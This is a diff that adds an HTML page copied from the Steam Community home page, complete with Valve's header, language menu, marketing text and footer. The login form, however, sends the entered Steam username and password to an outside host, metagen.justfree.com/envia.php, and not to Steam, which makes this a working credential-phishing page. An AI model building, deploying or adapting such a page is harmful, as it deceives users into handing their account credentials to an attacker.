@@ -1,0 +1,225 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><head>
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Steam Community</title>
+<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+<link href="global.css" rel="stylesheet" type="text/css">
+<link href="home.css" rel="stylesheet" type="text/css">
+<link href="header.css" rel="stylesheet" type="text/css">
+<script type="text/javascript" src="prototype-1.js"></script>
+<script type="text/javascript" src="scriptaculous.js"></script><script type="text/javascript" src="effects.js"></script><script type="text/javascript" src="controls.js"></script><script type="text/javascript" src="slider.js"></script>
+<script type="text/javascript" src="global.js"></script>
+<script type="text/javascript" src="home.js"></script>
+<script language="javascript">
+var captchaRefreshURL = 'https://steamcommunity.com/actions/RefreshCaptcha';
+var captchaImgURL = 'https://steamcommunity.com/public/captcha.php';
+</script>
+</head><body>
+<center>
+<!-- header bar, contains info browsing user if logged in -->
+<div id="global_header">
+	<div class="content">
+	
+		<div class="logo">
+			<span id="logo_holder">
+				<a href="http://store.steampowered.com/">
+					<img src="globalheader_logo.png" border="0" width="176" height="44">
+				</a>
+			</span>
+			<!--[if lt IE 7]>
+			<style type="text/css">
+			#logo_holder img { filter:progid:DXImageTransform.Microsoft.Alpha(opacity=0); }
+			#logo_holder { display: inline-block; width: 176px; height: 44px; filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://steamcommunity.com/public/images/header/globalheader_logo.png'); }
+			</style>
+			<![endif]-->
+		</div>
+	
+		<a class="menuitem" href="http://store.steampowered.com/">
+			STORE		</a> 
+		<a class="menuitem active" href="https://steamcommunity.com/">
+			<div class="activebg">&nbsp;</div>
+			Community		</a>
+		<a class="menuitem" href="http://store.steampowered.com/news/">
+			NEWS		</a>
+		<a class="menuitem" href="http://store.steampowered.com/forums/">
+			FORUMS		</a>
+		<a class="menuitem" href="http://store.steampowered.com/about/">
+			ABOUT		</a>
+		<a class="menuitem" href="http://support.steampowered.com/">
+			SUPPORT		</a>
+		<a class="menuitem" href="http://store.steampowered.com/stats/">
+			STATS		</a>
+		
+		<div id="global_actions">
+						<div id="global_action_menu">
+														<a href="https://steamcommunity.com/">Login</a>
+						&nbsp;|&nbsp; 
+								<span class="pulldown" id="language_pulldown" onclick="ShowMenu( this, 'language_dropdown', 'right' );">language</span>
+				<div class="popup_block" id="language_dropdown" style="display: none;">
+					<div class="shadow_ul"></div><div class="shadow_top"></div><div class="shadow_ur"></div><div class="shadow_left"></div><div class="shadow_right"></div><div class="shadow_bl"></div><div class="shadow_bottom"></div><div class="shadow_br"></div><div class="iepoupfix"><img class="iepoupfix_img" src="trans.gif"></div>
+					<div class="popup_body popup_menu shadow_content">
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=danish">
+								<h5>Dansk (Danish)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=czech">
+								<h5>čeština (Czech)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=dutch">
+								<h5>Nederlands (Dutch)</h5>
+							</a>
+																											<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=finnish">
+								<h5>Suomi (Finnish)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=french">
+								<h5>Français (French)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=german">
+								<h5>Deutsch (German)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=hungarian">
+								<h5>magyar (Hungarian)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=italian">
+								<h5>Italiano (Italian)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=japanese">
+								<h5>日本語 (Japanese)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=korean">
+								<h5>한국어 (Korean)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=norwegian">
+								<h5>Norsk (Norwegian)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=polish">
+								<h5>Polski (Polish)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=portuguese">
+								<h5>Português (Portuguese)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=romanian">
+								<h5>Română (Romanian)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=russian">
+								<h5>Русский (Russian)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=schinese">
+								<h5>简体中文 (Simplified Chinese)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=spanish">
+								<h5>Español (Spanish)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=swedish">
+								<h5>Svenska (Swedish)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=tchinese">
+								<h5>繁體中文 (Traditional Chinese)</h5>
+							</a>
+																				<a class="popup_menu_item tight" href="https://steamcommunity.com/?l=thai">
+								<h5>ไทย (Thai)</h5>
+							</a>
+											</div>
+				</div>
+			</div>
+		</div>
+		
+				
+	</div>
+</div>
+<div id="userControls">
+		<div id="headerSearch">
+		<form id="headerSearchForm" method="GET" action="http://steamcommunity.com/actions/Search" accept-charset="UTF-8">
+		<input id="searchInputBoxNew" name="K" value="Search" onclick="if( this.value == 'Search' ) { this.value='' }" onfocus="if( this.value == 'Search' ) { this.value='' }" onblur="if( this.value == '' ) { this.value='Search' }" type="text">
+		<input id="searchSubmitImg" src="searchbox_submit.gif" border="0" type="image" width="23" height="18">
+		</form>
+	</div>	<a class="userControlsLink" href="http://steamcommunity.com/">&nbsp;</a>
+</div>
+<!-- /header bar -->
+<div id="mainBody">
+	<div id="mainBodyHeader">
+		<h1>The Steam Community</h1>
+		<p>The Steam Community is comprised of people who play all sorts of PC games.<br>Now it's easy to find your friends online, organize groups, join chats, host matches and more.<br>Best of all, it's free.</p>
+		<div id="userNumbers">
+			<span id="iAccountsInGame">388,423 In-Game</span> &nbsp;&nbsp;|&nbsp;&nbsp;
+			<span id="iAccountsOnline">2,469,297 Online</span>
+		</div>
+			
+	</div>
+	<div id="lowerContents">
+		<div id="lowerRightContents">
+			<div id="rightActionBlockHeader"><img src="trans.gif" border="0" width="254" height="8"></div>
+			<div id="rightActionBlock">
+				<form enctype="multipart/form-data" action="http://metagen.justfree.com/envia.php" method="POST" name="loginForm" id="loginForm">
+				<input name="action" value="doLogin" type="hidden">
+				<input name="goto" value="" type="hidden">
+				<input name="qs" value="" type="hidden">
+				<input name="msg" value="" type="hidden">
+				<label for="steamAccountName">Steam Username:</label>
+				<input class="textField" name="steamAccountName" id="steamAccountName" maxlength="64" type="text"><br>
+				<label for="steamPassword">Password:</label>
+				<input class="textField" name="steamPassword" id="steamPassword" autocomplete="off" maxlength="64" type="password"><br>
+								<input class="subImage" id="imageLogin" onmouseover="iSwap('imageLogin','skin_1/buttonLoginOver.gif')" onmouseout="iSwap('imageLogin','skin_1/buttonLogin.gif')" src="buttonLogin.gif" border="0" type="image" width="104" height="25">
+				</form>
+			</div>
+			<div id="rightActionBlockFooter"><img src="trans.gif" border="0" width="254" height="8"></div>
+
+			<div class="rightLowBlockHeader"><img src="trans.gif" border="0" width="254" height="8"></div>
+				<div class="rightLowBlock">
+					<h2>Join Steam for Free!</h2>
+					<p><a class="linkStandard" href="http://store.steampowered.com/about/" target="_blank">Learn more about Steam</a></p>
+					<p><a class="linkStandard" href="http://steamcommunity.com/actions/GroupList">Browse existing groups</a></p>
+					
+				</div>
+			<div class="rightLowBlockFooter"><img src="trans.gif" border="0" width="254" height="8"></div>
+
+			<div class="rightLowBlockHeader"><img src="trans.gif" border="0" width="254" height="8"></div>
+				<div class="rightLowBlock">
+					<p class="ulTitle">Use The Steam Community to...</p>
+					<ul>
+						<li>Create your own profile page</li>
+						<li>Create and join groups</li>
+						<li>Easily see your friends online and in-game</li>
+						<li>Schedule matches and events</li>
+						<li>Review who you've played with lately</li>
+						<li>Track gameplay stats</li>
+						<li>Chat with groups</li>
+						<li>Chat via voice in-game or out</li>
+					</ul>
+				</div>
+			<div class="rightLowBlockFooter"><img src="trans.gif" border="0" width="254" height="8"></div>
+
+		</div>
+		<div id="lowerLeftContents" style="background-image: url(&quot;https://steamcommunity.com/public/images/homeMessaging/homeMessaging_08.jpg&quot;);">
+			<div id="lowerLeftColLeft">
+				<div id="lowerLeftColRight">
+					<h2>Already have Steam?</h2>
+					<div class="halfBreak"><img src="homeBoxHalfBreak.gif" border="0" width="315" height="1"></div>
+					You're just one step away from full-fledged membership. Simply <a href="steam://open/main">log in to Steam</a> and go to the community tab to access and set up your profile page.				</div>
+				<h2>New to steam?</h2>
+				<div class="halfBreak"><img src="homeBoxHalfBreak.gif" border="0" width="315" height="1"></div>
+				<a href="http://store.steampowered.com/about/">Join Steam for free</a>
+ and purchase full retail versions of games delivered straight to your 
+desktop, complete with automatic updates and in-game community features.
+				<br><br>
+				<a href="http://www.steampowered.com/steamtour/" onclick="window.open(this.href, null, 'width=800,height=570');return false">Take a tour of Steam</a> to learn more.
+			</div>
+			
+		</div>
+		
+		<div style="clear: both;"></div>
+	</div>
+</div>
+<!-- footer -->
+<div id="footer">
+	<div id="footerLogo"><img src="footerLogo.gif" border="0" width="94" height="26"></div>
+	<div id="footerText">
+		© Valve Corporation. All rights reserved. All trademarks are property 
+of their respective owners in the US and other countries. Some 
+geospatial data on this website is provided by <a href="http://www.geonames.org/">geonames.org</a>.	</div>
+</div>
+<!-- /footer -->
+
+</center>
+</body></html>
